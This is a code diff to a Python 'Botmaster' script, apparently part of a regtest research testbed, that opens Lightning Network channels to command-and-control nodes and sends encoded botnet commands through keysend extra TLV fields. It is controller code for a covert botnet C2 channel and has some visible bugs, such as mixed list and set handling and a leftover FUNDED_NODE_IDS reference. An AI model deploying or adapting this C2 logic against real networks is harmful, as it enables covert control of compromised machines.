@@ -1,5 +1,6 @@
 #NOTE!! this file should be in the BotMasterCommsComms(directory in home address) directory that gets mounted to the BM docker container
 import subprocess
+import argparse
 import json
 import logging
 import os
@@ -41,14 +42,14 @@ MESSAGE_TLV_TYPE = "34349334"
 
 def load_counter():
     """
-    Load the counter from the counter file. If the file doesn't exist, initialize it to 0.
+    Load the counter from the counter file. If the file doesn't exist, initialize it to 1.
     """
     if os.path.exists(COUNTER_FILE):
         with open(COUNTER_FILE, "r") as file:
             try:
                 return int(file.read().strip())
             except ValueError:
-                return 1  # If the file is corrupted, reset to 0
+                return 1  # If the file is corrupted, reset to 1
     return 1
 
 def save_counter(counter):
@@ -69,7 +70,6 @@ def run_lightning_cli(command):
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
-            check=True
         )
         # logging.debug(f"run_lightning_cli: stdout: {result.stdout}")
         #logging.debug(f"run_lightning_cli: stderr: {result.stderr}")
@@ -216,65 +216,64 @@ def discover_cc_nodes():
         with open('CC_address_list.txt', 'r') as id_file:
                 address_list = id_file.readlines()
 
-        valid_nodes = set()
+        valid_nodes = []
         for node in address_list:
             address = node.strip()
-            valid_nodes.add(address.split('@')[0])
+            valid_nodes.append(address.split('@')[0])
         logging.info(f"Valid CC nodes discovered: {valid_nodes}")
 
         return valid_nodes
     except Exception as e:
             logging.error(f"discover_cc_nodes: Exception occurred: {e}")
-            return set()
+            return []
 
 
 def fund_channels(num_channels = 1, entry_point = -1.0):
     '''
     Discover valid CC nodes and fund channels.
+    Will return saved funded channels if they exist, to fund completely new channels
+    you must call disconnect_all_channels() first.
     Parameters:
         num_channels: number of channels to create (default is 1)
         entry_point: percentage of where in the network to make these channels.
                     negative = random, 0 = first nodes, 1 = last nodes. (default is -1.0)
     '''
     # Load funded nodes if we have this saved
-    funded_nodes = []
+    funded_nodes = load_funded_nodes()
 
     if len(funded_nodes) == num_channels:
-        return
+        return funded_nodes
     elif len(funded_nodes) > num_channels:
         logging.debug(f'fund_channels: Loaded {len(funded_nodes)} nodes when {num_channels} is required. Disconnecting {num_channels - len(funded_nodes)} nodes.')
         # something something disconnect additional nodes here
-        return
-    
+        # funded_nodes = FUNCTION TO CLEAR OUT NONE-CHANNELED NODES HERE
+
     # if we get to this point, then we need additional nodes to channel to, or we just haven't channeled to any
     # same behavior either way
-    valid_cc_nodes = discover_cc_nodes()
-    while not valid_cc_nodes:
+    discovered_nodes = discover_cc_nodes()
+    while not discovered_nodes:
         logging.info("No valid CC nodes found for funding. Retrying in 10 seconds")
         time.sleep(10)
-        valid_cc_nodes = discover_cc_nodes()
+        discovered_nodes = discover_cc_nodes()
 
+    valid_cc_nodes = [cc_node for cc_node in discovered_nodes if cc_node not in funded_nodes]
 
-    valid_cc_nodes = valid_cc_nodes - INNOCENT_NODE_ID # this should eliminate the inno node from being a possible selection
-    valid_cc_nodes = valid_cc_nodes - funded_nodes # make sure we're eliminating nodes we've already funded
-
-    for retry_count in range(RETRY_MAX):
+    for _ in range(RETRY_MAX):
         new_nodes = pick_nodes(num_channels, entry_point, valid_cc_nodes)
     
         for node in new_nodes:
 
             # first check if we have a channel with this node, if we do, then we can skip everything
-            if ln_checker.has_channel_with(node):
+            if node in funded_nodes:
+                continue
+            elif (node not in funded_nodes) and ln_checker.has_channel_with(node):
                 logging.warning(f'fund_channels: Trying to fund a channel with {node} but channel already exists.')
-                funded_nodes.append(node)
+                funded_nodes.add(node)
                 continue
 
             # no channel with the node
             demoGetAddressAndConnect(node)
-            logging.info(f"fund_channels: Funding channel with node {node} (amount: {UNIQUE_FUNDING_AMOUNT}).")
-            ln_checker.check_funds()
-            run_lightning_cli(["fundchannel", node, str(UNIQUE_FUNDING_AMOUNT)])
-            logging.info(f'funds_channels: Funding channel with {node}')
+            connect_and_channel_node(node)
             # make sure channel is ready to receive
             ln_checker.wait_node_activated(node)
 
@@ -285,10 +284,8 @@ def fund_channels(num_channels = 1, entry_point = -1.0):
             else:
                 print(f'Successfully opened channel with {node}')
                 logging.info(f'Successfully opened channel with {node}')
-                funded_nodes.append(node)
-        
-        # check to see if we channeled with the correct number of nodes (get out if we have)
-        if len(funded_nodes) == num_channels:
+                funded_nodes.add(node)
+        else:
             print(f'BM node has channeled with {num_channels} nodes successfully.')
             logging.info(f'fund_channels: BM node has channeled with {num_channels} nodes successfully.')
             break
@@ -359,28 +356,28 @@ def save_funded_nodes(nodes):
     logging.debug(f'save_funded_nodes: Funded nodes saved')
 
 
-def load_funded_nodes() -> list:
+def load_funded_nodes() -> set:
     '''
     Load the funded nodes from a file.
     '''
-    funded_nodes = []
+    funded_nodes = set()
     if os.path.exists(FUNDED_NODE_FILE):
         # load funded nodes from the saved text file, which should be comma delineated
         logging.info(f'Found funded node file, loading.')
         try:
             with open(FUNDED_NODE_FILE, 'r') as file:
                 file_output = file.read().strip()
-                funded_nodes = file_output.split(',')
+                funded_nodes = set(file_output.split(','))
                 logging.debug(f'load_funded_nodes: Funded nodes are {funded_nodes}')
         except Exception as e:
             # something wrong happened, log it and return an empty array
             logging.error(f'load_funded_nodes: ERROR: {e}')
-            return []
+            return set()
         # we check if we have a channel with each of these nodes
-        verified_nodes = []
+        verified_nodes = set()
         for node in funded_nodes:
             if ln_checker.has_channel_with(node):
-                verified_nodes.append(node)
+                verified_nodes.add(node)
             else:
                 logging.warning(f'load_funded_nodes: Warning: Node {node} is saved but BM has no channel with it.')
         funded_nodes = verified_nodes
@@ -411,7 +408,7 @@ def interactive_command_sender():
 def encode_msg(in_msg):
     return in_msg.encode('utf-8').hex()
 
-def send_msg(message, counter):
+def send_msg(message, counter, funded_nodes):
     # Concatenate the user input with the counter
     message_with_counter = f"{message}|{counter}"
 
@@ -420,10 +417,6 @@ def send_msg(message, counter):
     tlv_json = json.dumps({MESSAGE_TLV_TYPE : encode_msg(message_with_counter)})
     # amount = 5  # Minimal msat for sending a message
 
-    # check to make sure FUNDED_NODE_IDS exists
-    while not FUNDED_NODE_IDS:
-        fund_single_channel()
-
     # Construct the lightning-cli command
     command = ["lightning-cli", "--regtest", "keysend",
     f"destination={FUNDED_NODE_IDS}",
@@ -431,30 +424,38 @@ def send_msg(message, counter):
     f"extratlvs={tlv_json}"]
 
     while load_counter() == counter:
-        try:
-            # Execute the command using shell=True to process the quotes correctly
-                    
-            if not ln_checker.is_node_active(FUNDED_NODE_IDS):
-                logging.info(f'No active channel with {FUNDED_NODE_IDS} - finding new active channel')
-                print('Channel disconneted, retrying connection.')
-                fund_single_channel()
-                
-            result = subprocess.run(command,
-                                    stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE,
-                                    text=True,
-                                    check=True)
-            if result.returncode == 0:
-                print(f"Command '{message_with_counter}' sent to node {FUNDED_NODE_IDS} successfully.")
-                print(f"Response: {result.stdout}")
-                save_counter(counter + 1)  # Save the updated counter after a successful send
-                return
-            else:
-                print(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
-                logging.error(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
-        except Exception as e:
-                print(f"Exception occurred while sending command: {e}")
-                logging.error(f"Exception occurred while sending command: {e}\nRetrying . . .")
+        for node in funded_nodes:
+            try:
+                # Execute the command using shell=True to process the quotes correctly
+                for _ in range(RETRY_MAX):
+                    if ln_checker.is_node_active(node):
+                        break
+                    else:
+                        logging.info(f'No active channel with {node} - attempting to re-channel.')
+                        print('Channel disconneted, retrying connection.')
+                        if not connect_and_channel_node(node):
+                            logging.error(f'send_msg: ERROR: Could not connect to node. Aborting.')
+                else:
+                    print(f'BM cannot create channel with {node} after {RETRY_MAX} tries. Aborting')
+                    logging.error(f'send_msg: ERROR: BM cannot create channel with {node} after {RETRY_MAX} tries. Aborting')
+                    return False
+
+                result = subprocess.run(command,
+                                        stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE,
+                                        text=True,
+                                        check=True)
+                if result.returncode == 0:
+                    print(f"Command '{message_with_counter}' sent to node {FUNDED_NODE_IDS} successfully.")
+                    print(f"Response: {result.stdout}")
+                    save_counter(counter + 1)  # Save the updated counter after a successful send
+                    return
+                else:
+                    print(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
+                    logging.error(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
+            except Exception as e:
+                    print(f"Exception occurred while sending command: {e}")
+                    logging.error(f"Exception occurred while sending command: {e}\nRetrying . . .")
         time.sleep(5)
         
 def load_this_node ():
@@ -462,29 +463,97 @@ def load_this_node ():
     output = get_node_info()
     THIS_NODE = output.get('id')
 
-def main(goal, message):
+def connect_and_channel_node(node):
+    '''
+    Connect and open a channel with a node
+    '''
+    try:
+        logging.info(f"fund_channels: Funding channel with node {node} (amount: {UNIQUE_FUNDING_AMOUNT}).")
+        ln_checker.check_funds()
+        run_lightning_cli(["fundchannel", node, str(UNIQUE_FUNDING_AMOUNT)])
+        logging.info(f'funds_channels: Funding channel with {node}')
+    except Exception as e:
+        logging.error(f'connect_and_channel_node: ERROR: {e}')
+
+def disconnect_all_channels(connected_nodes):
+    '''
+    Disconnect all nodes in connected_nodes
+    Parameters:
+        connected_nodes: Nodes to disconnect
+    '''
+    for node in connected_nodes:
+        disconnect_node(node)
+
+def disconnect_node(node):
+    '''
+    Disconnect completely from a node
+    '''
+    try:
+        logging.info(f'Disconnecting and closing channel with {node}')
+        run_lightning_cli(["close", f"id={node}"])
+        run_lightning_cli(["disconnect", node])
+    except Exception as e:
+        logging.error(f'disconnect_node: ERROR: {e}')  
+
+
+def main(goal, message, num_channels, entry_point, start_fresh):
+
     """
     Main Botmaster logic.
     """
-    logging.info("Starting Botmaster Node Script.")
-    connect_to_innocent() # why do we need to connect to the innocent?
+    logging.info("Starting Botmaster Node Script")
+    connect_to_innocent() # we need to connect to innocent to see channel gossip
     load_this_node()
-    logging.info("Funding single channel")
-    # Fund a single channel with a valid CC node
-    fund_single_channel()
-    if not FUNDED_NODE_IDS:
-        print("No node has been funded yet. Retrying.")
-        fund_single_channel()
+    logging.info(f"Funding {num_channels} channel(s)")
+    # Fund num_channels channels with valid CC nodes
+    funded_nodes = fund_channels(num_channels, entry_point)
+
+    if start_fresh:
+        logging.info(f'main: Closing and disconnceting from all nodes. Starting fresh')
+        save_counter('0')
+        disconnect_all_channels(funded_nodes)
+
+    elif not funded_nodes:
+        funded_nodes = fund_channels(num_channels, entry_point)
+
     # Allow interactive command sending
     if goal == 1:
-        interactive_command_sender()
+        interactive_command_sender(funded_nodes)
+    # used for automatic testing
     elif goal == 2:
         counter = load_counter()
-        send_msg(message, counter)
+        send_msg(message, counter, funded_nodes)
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='BotMaster Command and Control Manager')
     # add an option to take in "clear" to disconnect all channels and start fresh
-    if len(sys.argv) > 1:
-        main(2, sys.argv[1])
+    parser.add_argument('--msg',
+                        help = '''
+                        The message to send to the botnet.
+                        ''')
+    parser.add_argument('--cc', type = int, default = 1,
+                        help = '''
+                        Number of CC servers to send the command to.''')
+    parser.add_argument('--init', type = float, default = 0.0,
+                        help = '''
+                        Where in the botnet to connect as a percentage of the network.
+                        <0  : Random
+                        0.0 : Oldest nodes
+                        0.5 : Middle of the network
+                        1.0 : Youngest Nodes'''
+                        )
+    parser.add_argument('--fresh', action = 'store_true',
+                        help = '''
+                        Close and disconnect all previously funded nodes.
+                        ''')
+    
+    args = parser.parse_args()
+
+
+    if args.msg:
+        main(2, args.msg, args.cc, args.init, args.fresh)
     else:
-        main(1, None)
+        if input(f'Starting botmaster. Will connect to {args.cc} nodes at {args.init * 100}% of the network. Continue? y/n').lower() in ['y', 'yes']:
+            main(1, args.msg, args.cc, args.init, args.fresh)
+        else:
+            print(f'Exiting Botmaster script.')
